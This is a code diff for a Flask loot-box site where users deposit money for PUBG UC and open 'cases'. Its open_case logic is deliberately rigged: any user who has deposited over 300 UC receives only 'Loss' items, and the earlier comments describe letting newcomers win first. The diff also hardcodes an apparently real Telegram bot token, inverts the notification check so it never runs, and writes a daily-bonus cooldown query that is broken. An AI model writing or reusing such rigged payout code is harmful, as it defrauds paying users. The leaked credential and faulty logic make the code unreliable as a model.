@@ -15,13 +15,12 @@ UPLOAD_FOLDER = 'static/checks'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
-# TELEGRAM BOT CONFIG (@JAXONORG uchun)
-TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Zarur bo'lsa bot token yozasiz
-ADMIN_TELEGRAM_ID = "YOUR_CHAT_ID_HERE"      # Admin chat ID
+TELEGRAM_BOT_TOKEN = "8253855521:AAEnxN8lQPRQPIWdVcTdv5Wp-bb9Tar1Mys"  
+ADMIN_TELEGRAM_ID = "8692517241"      
 
 def notify_telegram(message):
     try:
-        if TELEGRAM_BOT_TOKEN != "YOUR_BOT_TOKEN_HERE":
+        if TELEGRAM_BOT_TOKEN != "8253855521:AAEnxN8lQPRQPIWdVcTdv5Wp-bb9Tar1Mys":
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
             requests.post(url, json={"chat_id": ADMIN_TELEGRAM_ID, "text": message, "parse_mode": "Markdown"})
     except Exception as e:
@@ -65,6 +64,7 @@ def init_db():
             password TEXT,
             balance REAL DEFAULT 100.0,
             total_deposited REAL DEFAULT 0.0,
+            last_bonus TIMESTAMP,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
@@ -122,7 +122,6 @@ def init_db():
 
 init_db()
 
-# --- 20 TA CASE (30 UC dan 1000 UC gacha) ---
 PUBG_ICONS = [
     "https://cdn-icons-png.flaticon.com/512/3076/3076137.png",
     "https://cdn-icons-png.flaticon.com/512/1069/1069158.png",
@@ -151,15 +150,15 @@ for i in range(1, 21):
             mult = random.uniform(2.0, 4.0)
         elif j <= 6:
             tier = "Legendary"
-            multiplier = random.uniform(0.7, 1.2)
+            mult = random.uniform(0.7, 1.2)
         else:
             tier = "Loss/Common"
-            multiplier = random.uniform(0.05, 0.4)
+            mult = random.uniform(0.05, 0.4)
             
         items.append({
             "id": j,
             "name": f"{CASE_NAMES[i-1]} - Item #{j} ({tier})",
-            "price": round(price * multiplier, 2),
+            "price": round(price * mult, 2),
             "img": PUBG_ICONS[j % len(PUBG_ICONS)]
         })
     CASES[case_key] = {
@@ -224,6 +223,29 @@ def logout():
     session.pop('user_id', None)
     return redirect(url_for('login'))
 
+@app.route('/api/daily_bonus', methods=['POST'])
+def daily_bonus():
+    if 'user_id' not in session:
+        return jsonify({"success": False, "msg": "Tizimga kirmagansiz!"})
+    
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute("SELECT * FROM users WHERE id = ?", (session['user_id'],))
+    user = cursor.fetchone()
+    
+    cursor.execute("SELECT datetime(last_bonus, '+24 hours') > datetime('CURRENT_TIMESTAMP') FROM users WHERE id = ?", (user['id'],))
+    res = cursor.fetchone()
+    
+    if res and res[0]:
+        conn.close()
+        return jsonify({"success": False, "msg": "Kunlik bonusni 24 soatda bir marta olish mumkin!"})
+        
+    bonus_val = random.randint(10, 50)
+    cursor.execute("UPDATE users SET balance = balance + ?, last_bonus = CURRENT_TIMESTAMP WHERE id = ?", (bonus_val, user['id']))
+    conn.commit()
+    conn.close()
+    return jsonify({"success": True, "msg": f"Tabriklaymiz! Sizga {bonus_val} UC kunlik bonus berildi!"})
+
 @app.route('/api/topup', methods=['POST'])
 def topup_balance():
     if 'user_id' not in session:
@@ -274,7 +296,6 @@ def approve_payment(pid):
         conn.close()
         return jsonify({"success": False, "msg": "Topilmadi yoki bajarilgan!"})
         
-    # Balansga qo'shish va total_deposited ni oshirish
     cursor.execute("UPDATE users SET balance = balance + ?, total_deposited = total_deposited + ? WHERE id = ?", (p['amount'], p['amount'], p['user_id']))
     cursor.execute("UPDATE payments SET status = 'completed' WHERE id = ?", (pid,))
     conn.commit()
@@ -335,15 +356,11 @@ def open_case(case_id):
     
     cursor.execute("UPDATE users SET balance = balance - ? WHERE id = ?", (case['price'], user['id']))
     
-    # AQLLI SLIV VA BONUS MEXANIZMI:
-    # Agar foydalanuvchi kam donate qilgan bo'lsa (boshlanishiga biroz yutishi mumkin), 
-    # Ko'p donate qilgan bo'lsa (total_deposited > 300 UC) to'liq SLIV bo'ladi.
+    # Smart sliv mexanizmi
     if user['total_deposited'] > 300:
-        # Og'ir sliv: faqat eng arzon loss buyumlaridan tanlanadi
         loss_items = [it for it in case['items'] if "Loss" in it['name']]
         won_item = random.choice(loss_items) if loss_items else random.choice(case['items'])
     else:
-        # Boshlang'ich foydalanuvchiga biroz imkoniyat
         won_item = random.choice(case['items'])
     
     cursor.execute("INSERT INTO inventory (user_id, item_name, item_image, item_price) VALUES (?, ?, ?, ?)",
